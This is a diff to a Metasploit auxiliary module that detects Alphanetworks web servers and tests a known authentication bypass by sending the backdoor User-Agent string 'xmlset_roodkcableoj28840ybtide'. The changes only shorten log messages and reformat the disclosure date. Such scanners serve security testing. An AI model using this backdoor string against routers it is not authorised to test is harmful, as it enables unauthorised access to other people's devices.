@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
       ],
       # First documented in detail by Craig, but looks like it's been known
       # (at least to the Russians :-) ) since 2010 - see post at forum.codenet.ru
-      'DisclosureDate' => '2013-10-12'
+      'DisclosureDate' => "Oct 12 2013"
     )
   end
 
@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi({ 'uri' => '/' })
     rescue ::Rex::ConnectionError
-      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return false
     end
 
@@ -51,9 +51,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     if is_alpha_web_server?
-      vprint_good("#{ip} - Alphanetworks web server detected")
+      vprint_good("Alphanetworks web server detected")
     else
-      vprint_error("#{ip} - Alphanetworks web server doesn't detected")
+      vprint_error("Alphanetworks web server doesn't detected")
       return
     end
 
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
         'agent' => 'xmlset_roodkcableoj28840ybtide'
       })
     rescue ::Rex::ConnectionError
-      vprint_error("#{ip}:#{rport} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return
     end
 
@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
     # not sure if this matches on other devices
     # TODO: Testing on other devices
     if res and res.code == 200 and res.headers["Content-length"] != 0 and res.body =~ /Home\/bsc_internet\.htm/
-      print_good("#{ip}:#{rport} - Vulnerable for authentication bypass via User-Agent Header \"xmlset_roodkcableoj28840ybtide\"")
+      print_good("Vulnerable for authentication bypass via User-Agent Header \"xmlset_roodkcableoj28840ybtide\"")
     end
   end
 end
